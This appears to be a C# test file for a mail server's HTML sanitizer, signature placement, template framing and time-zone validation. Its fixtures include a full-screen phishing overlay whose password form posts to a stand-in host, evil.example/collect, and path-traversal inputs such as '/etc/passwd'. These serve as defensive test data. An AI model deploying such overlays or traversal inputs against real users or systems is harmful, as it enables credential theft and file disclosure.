using System.Diagnostics;
using System.Text;
using MatMail.Data;
using MatMail.Messaging;
using MatMail.Services;
using MatMail.Tests.Support;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using MimeKit;

namespace MatMail.Tests;

/// <summary>HTML that goes into the page of the editor, and the edge cases of the lines that are left out: no database.</summary>
public class EditorHtmlTests
{
    private const string Overlay =
        "<div style=\"position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99;background:#ffffff;color:#cc0000\">" +
        "<form action=\"https://evil.example/collect\" method=\"post\"><input type=\"password\" name=\"p\"><button>Sign in</button></form>" +
        "<textarea name=\"t\"></textarea><select><option>x</option></select>" +
        "<b accesskey=\"k\" tabindex=\"1\" contenteditable=\"true\" id=\"mail-search-input\" name=\"App\" onclick=\"x()\">visible</b></div>";

    private static readonly string[] Forbidden =
    {
        "<form", "<input", "<button", "<textarea", "<select", "<option", "position", "z-index", "top:", "left:", "action=", "method=", "name=",
        "accesskey", "tabindex", "contenteditable", "onclick", "id=",
    };

    private static void AssertTamed(string html)
    {
        Assert.Contains("visible", html);
        foreach (string word in Forbidden)
        {
            Assert.DoesNotContain(word, html, StringComparison.OrdinalIgnoreCase);
        }
    }

    [Fact]
    public void What_goes_into_the_page_has_no_forms_no_positioning_and_no_names()
    {
        AssertTamed(EditorHtml.Clean(Overlay));
        AssertTamed(EditorHtml.Clean(Overlay, "data", "cid", "mailto", "tel"));
        AssertTamed(SignatureService.Sanitize(Overlay));
        AssertTamed(SignatureService.SanitizeTemplate(Overlay));
    }

    [Fact]
    public void Ordinary_formatting_survives_the_cleaning()
    {
        const string html =
            "<p style=\"font-family: Arial, sans-serif; font-size: 12px; color: #444444; text-align: center; margin: 0\"><b>Bold</b> <i>it</i> <u>u</u> " +
            "<a href=\"https://example.com/page\">link</a> <a href=\"mailto:max@example.com\">mail</a></p>" +
            "<table><tr><td style=\"padding: 4px; border: 1px solid #cccccc; background-color: #eeeeee; width: 100px\">cell</td></tr></table>" +
            "<img src=\"data:image/png;base64,iVBORw0KGgo=\" width=\"40\" height=\"20\" alt=\"logo\"><hr><ul><li>one</li></ul><h2>Title</h2>";

        string clean = SignatureService.Sanitize(html);

        foreach (string expected in new[] { "<b>Bold</b>", "<i>it</i>", "<u>u</u>", "href=\"https://example.com/page\"", "href=\"mailto:max@example.com\"", "<table", "<td", "<img", "width=\"40\"", "alt=\"logo\"", "<hr", "<ul><li>one</li></ul>", "<h2>Title</h2>", "font-size", "text-align", "border", "background-color" })
        {
            Assert.Contains(expected, clean);
        }
    }

    [Fact]
    public void The_quoted_text_of_a_hostile_message_loses_its_overlay_too()
    {
        string quoted = EditorHtml.Clean("<html><body>" + Overlay + "</body></html>", "mailto");

        AssertTamed(quoted);
    }

    [Fact]
    public void A_place_for_the_body_that_the_cleaning_removes_is_no_place()
    {
        Assert.False(TemplateService.HasPlaceForBody(SignatureService.SanitizeTemplate("<script>{{Body}}</script>")));
        Assert.True(TemplateService.HasPlaceForBody(SignatureService.SanitizeTemplate("<div>{{Body}}</div>")));
    }

    private static SignatureContext Sender(string? phone = null) => new("Alice Example", "alice@example.test", null, phone, "Home");

    [Fact]
    public void An_empty_line_inside_a_wrapper_leaves_the_rest_of_the_wrapper_alone()
    {
        string html = SignatureService.Render("<p><font color=\"#444444\">Best regards<br>Phone: {{Phone}}</font></p><p>{{Email}}</p>", Sender(), html: true);

        Assert.Contains("Best regards", html);
        Assert.DoesNotContain("Phone:", html);
        Assert.Contains("<font", html);
        Assert.Contains("alice@example.test", html);
    }

    [Fact]
    public void A_wrapper_around_lines_that_are_all_empty_goes_altogether()
    {
        string html = SignatureService.Render("<p>Hello</p><div><span>Phone: {{Phone}}<br>Tel: {{Mobile}}</span></div>", Sender(), html: true);

        Assert.Equal("<p>Hello</p>", html);
    }

    [Fact]
    public void Lines_of_preformatted_text_are_lines_too()
    {
        string html = SignatureService.Render("<pre>Best regards\nPhone: {{Phone}}\n{{Email}}</pre>", Sender(), html: true);

        Assert.Contains("Best regards", html);
        Assert.DoesNotContain("Phone:", html);
        Assert.Contains("alice@example.test", html);
    }

    [Fact]
    public void Dropping_the_last_line_of_a_text_leaves_no_stray_carriage_return()
    {
        Assert.Equal("Name", SignatureService.Render("Name\r\nPhone: {{Phone}}", Sender(), html: false));
        Assert.Equal("Name\r\nPhone: 123", SignatureService.Render("Name\r\nPhone: {{Phone}}", Sender("123"), html: false));
        Assert.Equal("Name\nHome", SignatureService.Render("Name\nPhone: {{Phone}}\n{{Tenant}}", Sender(), html: false));
    }
}

/// <summary>Which parts of a message are touched, and which are left as they are.</summary>
public class SignaturePlacementTests : IAsyncLifetime
{
    private const string Png = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";

    private TestHost _host = null!;
    private Seed _seed = null!;

    public async Task InitializeAsync()
    {
        _host = await TestHost.CreateAsync();
        _seed = await _host.SeedAsync();
    }

    public async Task DisposeAsync() => await _host.DisposeAsync();

    private async Task<Signature> AddSignatureAsync(
        string name, SignatureKind kind, string html, AppliesTo scope = AppliesTo.Tenant, bool addOnServer = false, bool isDefault = false, long? userId = null, long? mailboxId = null)
    {
        using IServiceScope scope0 = _host.Scope();
        var db = scope0.ServiceProvider.GetRequiredService<MatMailDbContext>();
        var signature = new Signature
        {
            TenantId = _seed.Tenant.Id, Name = name, Kind = kind, Scope = scope, Html = html, AddOnServer = addOnServer, IsDefault = isDefault, UserId = userId, MailboxId = mailboxId,
        };
        db.Signatures.Add(signature);
        await db.SaveChangesAsync();
        return signature;
    }

    private async Task AddTemplateAsync(string html = "<div><h1>{{Tenant}}</h1><div>{{Body}}</div></div>", TemplateMode mode = TemplateMode.PlainTextOnly)
    {
        using IServiceScope scope0 = _host.Scope();
        var db = scope0.ServiceProvider.GetRequiredService<MatMailDbContext>();
        db.MailTemplates.Add(new MailTemplate { TenantId = _seed.Tenant.Id, Name = "Frame", Html = html, Mode = mode, ForSmartHost = true, ForMailPrograms = true });
        await db.SaveChangesAsync();
    }

    private static MimeMessage Empty()
    {
        var message = new MimeMessage();
        message.From.Add(MailboxAddress.Parse("alice@example.test"));
        message.To.Add(MailboxAddress.Parse("someone@elsewhere.test"));
        message.Subject = "Hello";
        return message;
    }

    private async Task ApplySignaturesAsync(MimeMessage message, SubmissionSource source = SubmissionSource.MailProgram)
    {
        using IServiceScope scope = _host.Scope();
        var context = new SignatureContext("Alice Example", "alice@example.test", "CTO", null, "Home");
        await scope.ServiceProvider.GetRequiredService<SignatureService>().ApplyAsync(message, source, _seed.Tenant.Id, _seed.AliceMailbox.Id, _seed.Alice.Id, context);
    }

    private async Task<MailTemplate?> ApplyTemplatesAsync(MimeMessage message)
    {
        using IServiceScope scope = _host.Scope();
        var context = new SignatureContext("Alice Example", "alice@example.test", "CTO", null, "Home");
        return await scope.ServiceProvider.GetRequiredService<TemplateService>()
            .ApplyAsync(message, SubmissionSource.SmartHost, _seed.Tenant.Id, _seed.AliceMailbox.Id, _seed.Alice.Id, null, context);
    }

    private static TextPart Plain(string text) => new("plain") { Text = text };

    /// <summary>Text that is a file: it names itself (a script attaches a log like this), with or without a disposition.</summary>
    private static TextPart Attachment(string name, string subtype = "plain", string? disposition = null)
    {
        var part = new TextPart(subtype) { Text = "line one of the log\r\nline two\r\n", FileName = name };
        if (disposition is not null)
        {
            part.ContentDisposition = new ContentDisposition(disposition) { FileName = name };
        }

        return part;
    }

    // ---- what is protected ---------------------------------------------------------------------------------------------

    [Theory]
    [InlineData("-----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA256\r\n\r\nHello\r\n-----BEGIN PGP SIGNATURE-----\r\n\r\nabc\r\n-----END PGP SIGNATURE-----\r\n", true)]
    [InlineData("Dear Bob,\r\n\r\n-----BEGIN PGP MESSAGE-----\r\n\r\nhQEM...\r\n-----END PGP MESSAGE-----\r\n", true)]
    [InlineData("  -----BEGIN PGP MESSAGE-----\r\n", true)]
    [InlineData("> -----BEGIN PGP MESSAGE-----\r\n> hQEM...\r\n", false)]
    [InlineData("I wrote about -----BEGIN PGP MESSAGE----- in the middle of a line", false)]
    [InlineData("Just text\r\n", false)]
    public void Inline_pgp_is_protected_like_the_other_kinds(string text, bool expected)
    {
        MimeMessage message = Empty();
        message.Body = Plain(text);

        Assert.Equal(expected, MessageContent.IsProtected(message));
    }

    [DbFact]
    public async Task A_message_with_inline_pgp_gets_neither_footer_nor_template()
    {
        await AddSignatureAsync("Legal", SignatureKind.Footer, "<p>LEGAL</p>");
        await AddTemplateAsync();
        const string armour = "-----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA256\r\n\r\nHello\r\n-----BEGIN PGP SIGNATURE-----\r\n\r\nabc\r\n-----END PGP SIGNATURE-----\r\n";
        MimeMessage message = Empty();
        message.Body = Plain(armour);

        Assert.Null(await ApplyTemplatesAsync(message));
        await ApplySignaturesAsync(message);

        var part = Assert.IsType<TextPart>(message.Body);
        Assert.Equal(armour, part.Text.ReplaceLineEndings("\r\n"));
    }

    // ---- which parts are the body --------------------------------------------------------------------------------------

    [DbFact]
    public async Task A_log_that_a_script_attached_as_text_is_no_part_of_the_body()
    {
        await AddSignatureAsync("Legal", SignatureKind.Footer, "<p>LEGAL</p>");
        MimeMessage message = Empty();
        message.Body = new Multipart("mixed") { Plain("The report is attached."), Attachment("backup.log") };

        await ApplySignaturesAsync(message);

        var mixed = Assert.IsAssignableFrom<Multipart>(message.Body);
        Assert.Contains("LEGAL", ((TextPart)mixed[0]).Text);
        Assert.Equal("line one of the log\r\nline two\r\n", ((TextPart)mixed[1]).Text.ReplaceLineEndings("\r\n"));
    }

    [DbFact]
    public async Task An_html_file_with_a_name_is_an_attachment_and_the_text_still_gets_its_template()
    {
        await AddTemplateAsync();
        MimeMessage message = Empty();
        message.Body = new Multipart("mixed") { Plain("See the report."), Attachment("report.html", "html") };

        MailTemplate? applied = await ApplyTemplatesAsync(message);

        Assert.NotNull(applied);
        var mixed = Assert.IsAssignableFrom<Multipart>(message.Body);
        var alternative = Assert.IsAssignableFrom<Multipart>(mixed[0]);
        Assert.Contains("See the report.", ((TextPart)alternative[1]).Text);
        Assert.DoesNotContain("<h1>", ((TextPart)mixed[1]).Text);
    }

    [DbFact]
    public async Task A_message_cut_into_pieces_is_signed_once_at_its_end_and_is_not_framed()
    {
        await AddSignatureAsync("Legal", SignatureKind.Footer, "<p>LEGAL</p>");
        await AddTemplateAsync(mode: TemplateMode.AllMessages);
        var picture = new MimePart("image", "png") { Content = new MimeContent(new MemoryStream(Convert.FromBase64String(Png))), ContentDisposition = new ContentDisposition(ContentDisposition.Inline) };
        MimeMessage message = Empty();
        message.Body = new Multipart("mixed") { Plain("First piece"), picture, Plain("Second piece") };

        Assert.Null(await ApplyTemplatesAsync(message));
        await ApplySignaturesAsync(message);

        var mixed = Assert.IsAssignableFrom<Multipart>(message.Body);
        Assert.Equal("First piece", ((TextPart)mixed[0]).Text);
        Assert.Contains("LEGAL", ((TextPart)mixed[2]).Text);
    }

    [DbFact]
    public async Task Pieces_of_html_get_the_footer_after_the_last_one_with_its_picture()
    {
        await AddSignatureAsync("Legal", SignatureKind.Footer, $"<p><img src=\"data:image/png;base64,{Png}\"> LEGAL</p>");
        MimeMessage message = Empty();
        message.Body = new Multipart("mixed")
        {
            new TextPart("html") { Text = "<html><body><p>One</p></body></html>" },
            new MimePart("image", "gif") { Content = new MimeContent(new MemoryStream(new byte[] { 71, 73, 70 })), ContentDisposition = new ContentDisposition(ContentDisposition.Inline) },
            new TextPart("html") { Text = "<html><body><p>Two</p></body></html>" },
        };

        await ApplySignaturesAsync(message);

        string all = string.Concat(message.BodyParts.OfType<TextPart>().Select(p => p.Text));
        Assert.Equal(1, all.Split("LEGAL").Length - 1);
        Assert.Equal(1, all.Split("cid:").Length - 1);
        TextPart first = message.BodyParts.OfType<TextPart>().First();
        Assert.DoesNotContain("LEGAL", first.Text);
    }

    // ---- the signature that is already there ---------------------------------------------------------------------------

    [DbFact]
    public async Task A_message_is_not_signed_twice_when_its_text_carries_the_signature_already()
    {
        await AddSignatureAsync("Company", SignatureKind.Signature, "<p>Best regards</p><p>{{DisplayName}}</p>", addOnServer: true);
        MimeMessage message = Empty();
        message.Body = new BodyBuilder
        {
            HtmlBody = "<html><body><p>Hi</p><div>Best regards<br>Alice Example</div></body></html>",
            TextBody = "Hi\r\n\r\nBest regards\r\nAlice Example\r\n",
        }.ToMessageBody();

        await ApplySignaturesAsync(message);

        Assert.Equal(1, message.HtmlBody!.Split("Alice Example").Length - 1);
        Assert.Equal(1, message.TextBody!.Split("Alice Example").Length - 1);
    }

    [DbFact]
    public async Task A_signature_inside_a_quoted_message_does_not_count()
    {
        await AddSignatureAsync("Company", SignatureKind.Signature, "<p>Best regards</p><p>{{DisplayName}}</p>", addOnServer: true);
        MimeMessage message = Empty();
        message.Body = new BodyBuilder
        {
            HtmlBody = "<html><body><p>Thanks!</p><blockquote><div class=\"mm-signature\">Best regards<br>Alice Example</div></blockquote></body></html>",
            TextBody = "Thanks!\r\n\r\n> Best regards\r\n> Alice Example\r\n",
        }.ToMessageBody();

        await ApplySignaturesAsync(message);

        Assert.Equal(2, message.HtmlBody!.Split("Alice Example").Length - 1);
        Assert.Equal(2, message.TextBody!.Split("Alice Example").Length - 1);
    }

    [DbFact]
    public async Task A_signature_that_comes_to_nothing_is_not_added_and_leaves_no_separator()
    {
        await AddSignatureAsync("Phone only", SignatureKind.Signature, "<p>{{Phone}}</p>", addOnServer: true);
        MimeMessage message = Empty();
        message.Body = Plain("Hello");

        await ApplySignaturesAsync(message);

        Assert.Equal("Hello", ((TextPart)message.Body).Text);
    }

    // ---- order -----------------------------------------------------------------------------------------------------------

    [DbFact]
    public async Task Footers_come_in_the_documented_order_tenant_mailbox_user()
    {
        await AddSignatureAsync("User footer", SignatureKind.Footer, "<p>FOOTER-USER</p>", AppliesTo.User, userId: _seed.Alice.Id);
        await AddSignatureAsync("Mailbox footer", SignatureKind.Footer, "<p>FOOTER-MAILBOX</p>", AppliesTo.Mailbox, mailboxId: _seed.AliceMailbox.Id);
        await AddSignatureAsync("Tenant footer", SignatureKind.Footer, "<p>FOOTER-TENANT</p>");
        MimeMessage message = Empty();
        message.Body = new BodyBuilder { HtmlBody = "<html><body><p>Hi</p></body></html>", TextBody = "Hi" }.ToMessageBody();

        await ApplySignaturesAsync(message);

        string html = message.HtmlBody!;
        Assert.True(html.IndexOf("FOOTER-TENANT", StringComparison.Ordinal) < html.IndexOf("FOOTER-MAILBOX", StringComparison.Ordinal));
        Assert.True(html.IndexOf("FOOTER-MAILBOX", StringComparison.Ordinal) < html.IndexOf("FOOTER-USER", StringComparison.Ordinal));
        string text = message.TextBody!;
        Assert.True(text.IndexOf("FOOTER-TENANT", StringComparison.Ordinal) < text.IndexOf("FOOTER-USER", StringComparison.Ordinal));
    }

    [DbFact]
    public async Task The_web_client_preselects_the_most_specific_default_signature()
    {
        await AddSignatureAsync("A tenant default", SignatureKind.Signature, "<p>T</p>", isDefault: true);
        await AddSignatureAsync("Z user default", SignatureKind.Signature, "<p>U</p>", AppliesTo.User, isDefault: true, userId: _seed.Alice.Id);
        await AddSignatureAsync("M mailbox default", SignatureKind.Signature, "<p>M</p>", AppliesTo.Mailbox, isDefault: true, mailboxId: _seed.AliceMailbox.Id);
        await AddSignatureAsync("B not a default", SignatureKind.Signature, "<p>B</p>");

        using IServiceScope scope = _host.Scope();
        IReadOnlyList<Signature> list = await scope.ServiceProvider.GetRequiredService<SignatureService>().GetSelectableAsync(_seed.Tenant.Id, _seed.AliceMailbox.Id, _seed.Alice.Id);

        Assert.Equal(new[] { "Z user default", "M mailbox default", "A tenant default", "B not a default" }, list.Select(s => s.Name));
    }

    // ---- encoding and size -------------------------------------------------------------------------------------------------

    [DbFact]
    public async Task A_footer_with_umlauts_in_a_message_labelled_7bit_leaves_with_a_label_that_fits()
    {
        await AddSignatureAsync("Legal", SignatureKind.Footer, "<p>Geschäftsführer Müller · 5 €</p>");
        string raw = "From: alice@example.test\r\nTo: bob@example.test\r\nSubject: x\r\nMessage-ID: <seven@example.test>\r\nMIME-Version: 1.0\r\n" +
                     "Content-Type: text/plain; charset=us-ascii\r\nContent-Transfer-Encoding: 7bit\r\n\r\nPlain ascii text\r\n";

        using IServiceScope scope = _host.Scope();
        SubmissionResult result = await scope.ServiceProvider.GetRequiredService<MailSubmission>().SubmitAsync(new SubmissionRequest
        {
            Raw = Encoding.ASCII.GetBytes(raw),
            EnvelopeFrom = "alice@example.test",
            Recipients = new[] { "bob@example.test" },
            TenantId = _seed.Tenant.Id,
            MailboxId = _seed.AliceMailbox.Id,
            SenderUserId = _seed.Alice.Id,
        });
        Assert.True(result.Accepted, result.Error);

        var db = scope.ServiceProvider.GetRequiredService<MatMailDbContext>();
        MailMessage delivered = await db.MailMessages.AsNoTracking().SingleAsync(m => m.MailboxId == _seed.BobMailbox.Id);
        byte[] stored = (await scope.ServiceProvider.GetRequiredService<MailStore>().GetRawAsync(delivered.Id))!;
        string wire = Encoding.Latin1.GetString(stored);
        string header = wire[..wire.IndexOf("\r\n\r\n", StringComparison.Ordinal)];

        bool highBytes = stored.Any(b => b > 127);
        bool sevenBit = !header.Contains("Content-Transfer-Encoding", StringComparison.OrdinalIgnoreCase) || header.Contains("Content-Transfer-Encoding: 7bit", StringComparison.OrdinalIgnoreCase);
        Assert.False(highBytes && sevenBit, header);
        Assert.Contains("Geschäftsführer Müller · 5 €", (await MimeMessage.LoadAsync(new MemoryStream(stored))).TextBody);
    }

    [DbFact]
    public async Task A_huge_text_goes_out_without_a_template_instead_of_being_multiplied()
    {
        await AddTemplateAsync();
        MimeMessage message = Empty();
        message.Body = Plain(new string('x', 4_100_000) + "\r\n");

        Assert.Null(await ApplyTemplatesAsync(message));
        Assert.IsType<TextPart>(message.Body);
    }

    [DbFact]
    public async Task A_document_full_of_unfinished_body_tags_is_framed_quickly()
    {
        await AddTemplateAsync(mode: TemplateMode.AllMessages);
        MimeMessage message = Empty();
        message.Body = new TextPart("html") { Text = "<html>" + string.Concat(Enumerable.Repeat("<body ", 150_000)) + "</html>" };

        var timer = Stopwatch.StartNew();
        MailTemplate? applied = await ApplyTemplatesAsync(message);
        timer.Stop();

        Assert.NotNull(applied);
        Assert.True(timer.Elapsed < TimeSpan.FromSeconds(3), timer.Elapsed.ToString());
    }

    [DbFact]
    public async Task A_second_place_for_the_body_stays_empty_instead_of_showing_as_text()
    {
        await AddTemplateAsync("<div>{{Body}}</div><div>{{ Body }}</div>");
        MimeMessage message = Empty();
        message.Body = Plain("Once");

        await ApplyTemplatesAsync(message);

        string html = message.HtmlBody!;
        Assert.Equal(1, html.Split("Once").Length - 1);
        Assert.DoesNotContain("{{", html);
    }
}

public class TimeZoneGuardTests
{
    [Theory]
    [InlineData("Europe/Berlin", true)]
    [InlineData("UTC", true)]
    [InlineData("America/Argentina/Buenos_Aires", true)]
    [InlineData("Europe/Atlantis", false)]
    [InlineData("../../dev/zero", false)]
    [InlineData("/etc/passwd", false)]
    [InlineData("Europe/../Berlin", false)]
    [InlineData("", false)]
    [InlineData("Europe/Berlin\0", false)]
    [InlineData("A/B/C/D/E", false)]
    public void Only_names_of_zones_are_looked_up(string id, bool known) => Assert.Equal(known, Fmt.IsKnownZone(id));

    [Fact]
    public void A_name_of_an_absurd_length_is_not_even_considered()
        => Assert.False(Fmt.IsKnownZone("Europe/" + new string('a', 5_000)));
}

/// <summary>What the compose window of the web client is given: a reply, a forward and a draft are as clean as anything that goes into the page.</summary>
public class ComposeEditorHtmlTests : IAsyncLifetime
{
    private const string Overlay =
        "<div style=\"position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99;background:#ffffff\">" +
        "<form action=\"https://evil.example/collect\" method=\"post\"><input type=\"password\" name=\"p\"><button>Sign in</button></form>" +
        "<b>visible</b></div>";

    private TestHost _host = null!;
    private Seed _seed = null!;

    public async Task InitializeAsync()
    {
        _host = await TestHost.CreateAsync(c => c.Server.MaxUploadMb = 5);
        _seed = await _host.SeedAsync();
        AppInfo.DataDir = Path.Combine(Path.GetTempPath(), "matmail-test-data-" + Guid.NewGuid().ToString("N"));
    }

    public async Task DisposeAsync() => await _host.DisposeAsync();

    private static byte[] Hostile()
    {
        var message = new MimeMessage();
        message.From.Add(MailboxAddress.Parse("mallory@evil.example"));
        message.To.Add(MailboxAddress.Parse("alice@example.test"));
        message.Subject = "Your account";
        message.MessageId = "hostile@evil.example";
        message.Body = new TextPart("html") { Text = "<html><body>" + Overlay + "</body></html>" };
        return MimeSerializer.ToBytes(message);
    }

    private static void AssertTamed(string? html)
    {
        Assert.NotNull(html);
        Assert.Contains("visible", html);
        foreach (string word in new[] { "<form", "<input", "<button", "position", "z-index", "action=", "name=" })
        {
            Assert.DoesNotContain(word, html, StringComparison.OrdinalIgnoreCase);
        }
    }

    [DbFact]
    public async Task A_reply_a_forward_and_a_draft_open_without_the_overlay_of_the_message_they_come_from()
    {
        using IServiceScope scope = _host.ScopeAs(_seed.Alice);
        MailUser? alice = await scope.ServiceProvider.GetRequiredService<MailAccessService>().AuthenticateAsync("alice", "Test-Passw0rd!", "127.0.0.1");
        Assert.NotNull(alice);
        var folders = scope.ServiceProvider.GetRequiredService<FolderService>();
        var store = scope.ServiceProvider.GetRequiredService<MailStore>();
        var compose = scope.ServiceProvider.GetRequiredService<ComposeService>();

        MailFolder inbox = (await folders.FindByKindAsync(_seed.AliceMailbox.Id, FolderKind.Inbox))!;
        MailMessage original = await store.AddAsync(inbox.Id, new NewMessage(Hostile()));
        AssertTamed((await compose.PrepareReplyAsync(alice, original.Id, "reply"))?.Html);
        AssertTamed((await compose.PrepareReplyAsync(alice, original.Id, "forward"))?.Html);

        // A draft that did not come through the compose window (a mail program put it there, somebody else with access did).
        MailFolder drafts = (await folders.FindByKindAsync(_seed.AliceMailbox.Id, FolderKind.Drafts))!;
        MailMessage draft = await store.AddAsync(drafts.Id, new NewMessage(Hostile()) { IsDraft = true, IsRead = true });
        AssertTamed((await compose.OpenDraftAsync(alice, draft.Id))?.Html);
    }
}
